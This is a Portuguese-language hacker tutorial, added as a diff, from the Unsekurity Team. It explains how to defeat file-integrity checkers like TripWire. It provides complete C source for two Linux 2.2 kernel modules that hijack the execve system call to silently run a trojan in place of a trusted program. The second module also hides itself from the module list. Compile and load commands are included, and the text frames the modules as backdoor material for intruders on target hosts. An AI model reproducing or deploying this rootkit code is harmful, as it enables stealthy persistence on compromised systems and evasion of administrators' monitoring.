@@ -1,0 +1,480 @@
+############################################################################
+############################ UNSEKURITY TEAM ###############################
+############################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Estes e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+
+Este artigo visa demosntrar algumas tecnicas para combater um conceito
+ou mesmo varios acerta do uso de programas de seguranca.Este artigo
+possui somente propositos educacionais, nao nos responsabilizamos pelo
+mau uso das informacoes e dados aqui contidos.
+
+			 ------------------------
+			|   LKM versus TripWire  |
+			 ------------------------
+
+----------------------------------INDICE----------------------------------
+
+1 - INTRODUCAO.
+2 - PROGRAMAS CHECADORES.
+3 - ENGANANDO.
+    3.1 - A Tecnica.
+    3.2 - Dois Executaveis.
+    3.3 - Finalmente Enganando.
+    3.4 - Sugestoes.
+4 - TERMINANDO.
+    4.1 - Links e Referencias.
+    4.2 - Consideracoes Finais.
+
+--------------------------------------------------------------------------
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+No intuito de dificultar a acao de invasores na construcao de Backdoors e
+Rootkits a comunidade de seguranca tornou pratica uma teoria sobre checar
+determinados arquivos(executaveis ou nao) periodicamente no intuito de
+detectar possiveis alteracoes que estes arquivos poderiam sofrer por
+parte de invasores.Esses programas foram ficando cada vez mais
+aperfeicoados, implementando algoritmos de 'somas verificadoras'(checksum)
+cada vez mais complexos e de dificil "quebra".Entao a comunidade hacker
+passou a pensar em resolver esse problema(o conceito de backdoor como uma
+tecnica fucadora estava em jogo), e aos poucos varias teorias foram sendo
+meditadas e a pratica das mesmas tornou-se efetiva e um fato.Para tornar
+publico as massas o feito, varios artigos e textos foram divulgados sobre
+o mesmo, destaque para o artigo que a phrack divulgou "Bypassing Integrity
+Checking Systems" em 1997(antigo, nao??).O esquema descrito lah eh para
+FreeBSD.Para sistemas linux, um excelente tutorial da The Hackers Choice
+descreve pormenores da teoria usada e um codigo-fonte(nos meus testes ele
+nunca funcionou, ao meu ver contem erros.).Irei nesse artigo abordar a 
+mesma teoria, soh que em sistemas Linux com kernel 2.2.13(Slackware 7.0).
+Se sua kernel nao for esta, pegue o conceito, veja os tutoriais sobre LKM
+e se desejar faca um LKM para seu sistema, mas com LKM todo cuidado eh
+pouco.
+
+-------------------------
+2 - PROGRAMAS CHECADORES |
+-------------------------
+
+O que eu chamo aqui de programas checadores sao exatamente estes programas
+que checam a integridade dos arquivos.O mais famoso desses programas se
+chama TripWire.Existe um excelente programa checador feito pelo fcerqueira
+da www.bufferoverflow.org que pode ser obtido nesse mesmo site, o lstat.
+O funcionamento da maioria desses programas checadores eh parecido, cria-se
+um arquivo database contendo informacoes sobre o estado "original" ou
+atual do seu arquivo(arquivo que pretende 'proteger').Essa database serah
+usada para consultas futuras via executavel do programa checador.Algumas
+coisas serao comparadas nessas consultas como tamanho do arquivo, data,
+soma verificadora(checksum), etc..
+Esses programas sao verdadeiramente uteis, suas utilidades sao
+consideraveis.Mas como "todo" programa de seguranca que existe, nao deve
+ser considerado como algo super-eficiente e inquebravel.Veremos abaixo
+o porque dessa afirmacao no caso desses programas.
+
+--------------
+3 - ENGANANDO |
+--------------
+
+Como foi dito no item anterior, a eficacia desses programas eh relativa.
+Um invasor com conhecimentos basicos nao instalaria jamais um Rootkit que
+altera um executavel(Linux Rootkit possui aproximadamente 3 megas e meio
+compactado).Existem esquemas de Backdoors mais eficientes, e Rootkits
+usados por meio de LKM representam um perigo realmente grande para um
+administrador.O esquema que irei disponibilizar vem de uma teoria antiga e
+amplamente divulgada na Internet.Nao eh algo novo, talvez o programa seja
+novo,pois eh voltado para kernel 2.2.13.Nao pretendo ensinar como escrever
+LKM(Loadable Kernel Module), um tutorial sobre isso jah estah sendo feito
+e em breve estarah na home page do Unsekurity Team.
+
+3.1 - A Tecnica
+----------------
+
+A tecnica usada para enganar esse programas consiste basicamente em
+redirecionar a execucao de um programa via LKM.Existem outras tecnicas,mas
+creio que esta eh a mais simples.Digamos que o programa checador no host
+alvo esteja com um database para o arquivo "/tmp/exec", mas a gente
+quer executar uma backdoor,trojans ou algum outro executavel qualquer,tudo
+que precisamos fazer eh um redirecionamento da execucao desse arquivo.
+Cada vez que alguem tentar executar "/tmp/exec" o sistema atraves de LKM
+irah redirecionar a execucao do programa para nosso executavel, executando
+assim o que desejarmos.
+
+3.2 - Dois Executaveis
+-----------------------
+
+Irei descrever aqui dois programas basicos que servirao para ilustrar de
+forma clara os dois programas descritos acima.Um serah o programa normal
+(no item acima, o /tmp/exec) e o outro serah o programa que queremos
+executar.Vejamos os fontes:
+
+-------------------------------exec.c----------------------------------
+
+/* SIMPLES EXECUTAVEL */
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+printf("\nEste eh o arquivo executavel normal!\n\n");
+}
+
+-------------------------------------------------------------------------
+
+O programa acima servirah como o executavel normal, compile ele
+normalmente, fique atento somente ao PATH onde ele se encontrarah.
+Abaixo segue o fonte do programa que queremos executar:
+
+---------------------------------trojan.c--------------------------------
+
+/* Simples Exemplo */
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+printf("Trojan Executado com Sucesso!!\n");
+return 0;
+}
+
+-------------------------------------------------------------------------
+
+Este eh o arquivo que queremos executar.Estou enfatizando o mesmo atraves
+das strings que eles imprimem na tela.Para efeito de ilustracao, o
+executavel trojan eh o programa que serah executavel via redirecionamento
+atraves de um LKM.Compile ele normalmente(gcc -o trojan trojan.c) e atente
+ao PATH aonde o mesmo se encontrarah.
+
+3.3 - Finalmente Enganando
+---------------------------
+
+A tao chegada hora chegou! O Programa abaixo eh o responsavel direto pela
+tecnica de redirecionamento para passar por programas checadores de
+integridade de arquivos.Lembrando novamente que o LKM abaixo eh para
+sistema Linux com Kernel 2.2.13 (Slackware 7.0).Como eu disse nao irei
+ensinar escrita de LKM aqui, apenas demonstrar na pratica a tecnica de
+redirecionamento.Abaixo segue o primeiro arquivo:
+
+----------------------------NLbyetrip1.c--------------------------------
+
+/* SIMPLES LKM REDIRECIONADOR DE ARQUIVO EXECUTAVEL.
+   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+
+   Thanks Unsekurity Team.
+   http://unsekurity.virtualave.net/
+   http://unsekurity.cyberpunk.com.br/
+   Desenvolvido com base no tutorial da THC sobre LKM.
+   http://www.infowar.co.uk/thc/
+
+   OBS:   LKM PARA KERNEL 2.2.13 (SlackWare 7.0).
+          Nao nos responsabilizamos pelo mau uso deste programa.
+          Construido somente para propositos educacionais.
+*/
+
+#define     MODULE
+#define   __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <linux/dirent.h>
+#include <linux/types.h>
+#include <linux/proc_fs.h>
+
+/*
+defina abaixo os dois arquivos a serem manipulados, o bom eh o
+arquivo original, e o mau eh o que nos queremos executar. */
+
+#define  BOM_ARQUIVO  "/tmp/exec"
+#define  MAU_ARQUIVO  "/tmp/trojan"
+
+extern void* sys_call_table[];
+int errno;
+
+int __NR_myexecve;
+static inline _syscall1(int, brk, void *, end_data_segment);
+
+int (*original_execve) (const char *, const char *[], const char *[]);
+
+int my_execve(const char *filename, const char *argv[], const char *envp[])
+{
+long __res;
+__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve),"b"((long)
+(filename)), "c"((long) (argv)),"d"((long) (envp)));
+    return (int) __res;
+}
+int hacked_execve(const char *filename, const char *argv[], const char
+*envp[])
+{
+char *test;
+int ret, tmp;
+char *truc = BOM_ARQUIVO;        /* arquivo que deveria ser executado */
+char *nouveau = MAU_ARQUIVO;     /* arquivo que serah executado */
+unsigned long mmm;
+
+test = (char *) kmalloc(strlen(truc) + 2, GFP_KERNEL);
+copy_from_user(test, filename, strlen(truc));
+
+test[strlen(truc)] = '\0';
+
+if (!strcmp(test, truc)){
+kfree(test);
+mmm = current->mm->brk;
+ret = brk((void *) (mmm + 256));
+if (ret < 0)
+return ret;
+
+copy_to_user((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
+
+ret = my_execve((char *) (mmm + 2), argv, envp);
+tmp = brk((void *) mmm);
+}
+
+else {
+kfree(test);
+ret = my_execve(filename, argv, envp);
+}
+ return ret;
+}
+int init_module(void) {
+__NR_myexecve = 250;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+original_execve = sys_call_table[__NR_execve];
+if (__NR_myexecve == 0)
+{
+sys_call_table[__NR_myexecve] = original_execve;
+sys_call_table[__NR_execve] = (void *) hacked_execve;
+printk("<1>Modulo Carregado com Sucesso!!\n");
+}
+ return 0;
+}
+
+void cleanup_module(void)
+{
+sys_call_table[__NR_execve]=original_execve;
+printk("<1>Modulo Descarregado com Sucesso!!\n");
+printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+
+--------------------------------------------------------------------------
+
+O esquema para carregar o LKM eh o seguinte:
+
+* Compile da seguinte maneira:
+
+# gcc -c -O3 NLbyetrip1.c
+
+* Depois carregue o modulo no sistema:
+
+# insmod NLbyetrip1.o
+
+Carregado o modulo, o redirecionamento eh entao feito.Existe um empecilho
+e mais abaixo eu vou comentar sobre ele, teste executando "/tmp/exec" e
+verah que o LKM funciona perfeitamente.Se voce digitar lsmod voce poderah
+ver esse LKM carregado no sistema, por que nao dificultar???:) Abaixo
+segue um exemplo de LKM 'stealph' (de dificil percepcao):
+
+------------------------------NLbyetrip2.c-------------------------------
+
+/* SIMPLES LKM REDIRECIONADOR DE ARQUIVO EXECUTAVEL.
+   DESENVOLVIDO POR NASH LEON VULGO CORACAODELEAO.
+   nashleon@yahoo.com.br
+
+   Thanks Unsekurity Team.
+   http://unsekurity.virtualave.net/
+   http://unsekurity.cyberpunk.com.br/
+   Desenvolvido com base no tutorial da THC sobre LKM.
+   http://www.infowar.co.uk/thc/
+
+   OBS:   LKM PARA KERNEL 2.2.13 (SlackWare 7.0).
+          Nao nos responsabilizamos pelo mau uso deste programa.
+          Construido somente para propositos educacionais.
+          Esta eh uma versao 'stealph'.
+          Nao aparece via cat /proc/modules.
+          Para descarrega-la...:)..I don't know!!:)...
+          Ainda nao desenvolvi um programa interativo.Reinicia
+          teu sistema.
+*/
+#define     MODULE
+#define   __KERNEL__
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <linux/dirent.h>
+#include <linux/types.h>
+#include <linux/proc_fs.h>
+
+/*
+defina abaixo os dois arquivos a serem manipulados, o bom eh o
+arquivo original, e o mau eh o que nos queremos executar. */
+
+#define  BOM_ARQUIVO  "/tmp/exec"
+#define  MAU_ARQUIVO  "/tmp/trojan"
+
+extern void* sys_call_table[];
+int errno;
+
+int __NR_myexecve;
+
+static inline _syscall1(int, brk, void *, end_data_segment);
+
+int (*original_execve) (const char *, const char *[], const char *[]);
+
+int my_execve(const char *filename, const char *argv[], const char *envp[])
+{
+long __res;
+__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve),"b"((long)
+(filename)), "c"((long) (argv)),"d"((long) (envp)));
+    return (int) __res;
+}
+int hacked_execve(const char *filename, const char *argv[], const char *envp[])
+{
+char *test;
+int ret, tmp;
+char *truc = BOM_ARQUIVO;        /* arquivo que deveria ser executado */
+char *nouveau = MAU_ARQUIVO;     /* arquivo que serah executado */
+unsigned long mmm;
+
+test = (char *) kmalloc(strlen(truc) + 2, GFP_KERNEL);
+copy_from_user(test, filename, strlen(truc));
+
+test[strlen(truc)] = '\0';
+
+if (!strcmp(test, truc)){
+kfree(test);
+mmm = current->mm->brk;
+ret = brk((void *) (mmm + 256));
+if (ret < 0)
+return ret;
+
+copy_to_user((void *) (mmm + 2), nouveau, strlen(nouveau) + 1);
+
+ret = my_execve((char *) (mmm + 2), argv, envp);
+tmp = brk((void *) mmm);
+}
+else {
+kfree(test);
+ret = my_execve(filename, argv, envp);
+}
+ return ret;
+}
+
+int init_module(void) {
+
+/* Abaixo segue esquema para esconder LKM */
+
+struct module *modulo = &__this_module, *apagar = NULL;
+EXPORT_NO_SYMBOLS; /* Macro para nao exportar simbolo kernel */
+apagar = modulo->next;
+/* Fazer tudo == NULL */
+if (apagar) {
+int i;
+modulo->name = apagar->name;
+modulo->size = apagar->size;
+modulo->flags = apagar->flags;
+
+for (i = 0; i < GET_USE_COUNT(apagar)+1; i++)
+MOD_INC_USE_COUNT;
+modulo->next = apagar->next;
+}
+
+__NR_myexecve = 250;
+while (__NR_myexecve != 0 && sys_call_table[__NR_myexecve] != 0)
+__NR_myexecve--;
+original_execve = sys_call_table[__NR_execve];
+if (__NR_myexecve == 0)
+{
+sys_call_table[__NR_myexecve] = original_execve;
+sys_call_table[__NR_execve] = (void *) hacked_execve;
+printk("<1>Modulo Carregado com Sucesso!!\n");
+}
+ return 0;
+}
+
+/* Nesse esquema a funcao abaixo eh soh para ingles ver. */
+
+void cleanup_module(void)
+{
+ sys_call_table[__NR_execve]=original_execve;
+ printk("<1>Modulo Descarregado com Sucesso!!\n");
+}
+
+--------------------------------------------------------------------------
+
+Aih estah um modulo que nao eh visto por cat /proc/modules.Compile ele
+da mesma forma que o outro, se souber escrever LKM, tente fazer um
+programa interativo para ele, para que o mesmo possa ser descarregado,se
+nao, para descarrega-lo basta Reiniciar o sistema.
+
+
+3.4 - Sugestoes
+----------------
+
+Vimos um exemplo basico, mas tambem existem limitacoes.Nesse exemplo
+se alguem executasse algo como ./exec, executaria o arquivo normal e nao
+o nosso trojan, mas o esquema pode ser melhorado para evitar isso.Essa
+tecnica usada com outros LKMs que escondem um processo, um arquivo, e
+sao carregados quando o sistema eh Reinicializado constituem uma eficaz
+Backdoor, de dificil deteccao por Administradores menos experiente.Esse
+esquema que descrevih jah eh amplamente conhecido, por isso, nao encha
+seu ego desrespeitando ou mesmo insultando a inteligencia de um Admin.
+Faca seus proprios esquemas, procure sempre imaginar que o cara do outro
+lado eh preparado, que ele estah usando ferramentas para dificultar sua
+vida e seu trabalho.
+
+
+4 - TERMINANDO
+---------------
+
+Apenas mais uma breve despedida.
+Se for possivel, amigo, aprenda sobre LKM, saiba como funcionam tambem
+todas as ferramentas de IDS, dentre elas os checadores de arquivos, leve
+em conta todos os possiveis metodos usados pela seguranca para dificultar
+seu trabalho, pesquise sobre as tecnicas usadas, cuidado com o syslogd
+quando usar LKM, atencao dobrada em tudo, voce pode "crashear" o host
+alvo trazendo serias consequencias para voce e a rede em sih.
+
+4.1 - Links e Referencias
+--------------------------
+
+* Sobre LKM:
+
+http://www.phrack.com -> Procure por p50-5, p51-9 e p52-18.
+http://www.infowar.co.uk/thc -> Procure pelos tutoriais de LKM.
+
+* Sobre Checadores:
+
+http://www.bufferoverflow.org/ -> Procure pelo lstat.
+http://packetstorm.securify.com/ -> Procure por tripwire.
+
+* Outros:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+http://www.hacker.com.br/
+
+
+4.2 - Consideracoes Finais
+---------------------------
+
+Aih estah amigo NewBie, mais um artigo abordando uma tecnica fucadora
+conhecida.Espero que o mesmo venha a ser util para voce.Nao se preocupe
+se os LKMs parecam estranhos para voce de inicio, isto eh normal, leia
+os tutoriais dos links acima, e aguarde um pouco, pois em breve, talvez
+saia material do Unsekurity sobre isso.Como voce pode ver, aos poucos
+iremos disponibilizar mais material fucador interessante.Sem mais
+por enquanto.
+
+						Nash Leon.
+
+----------------------------------EOF-------------------------------------
+
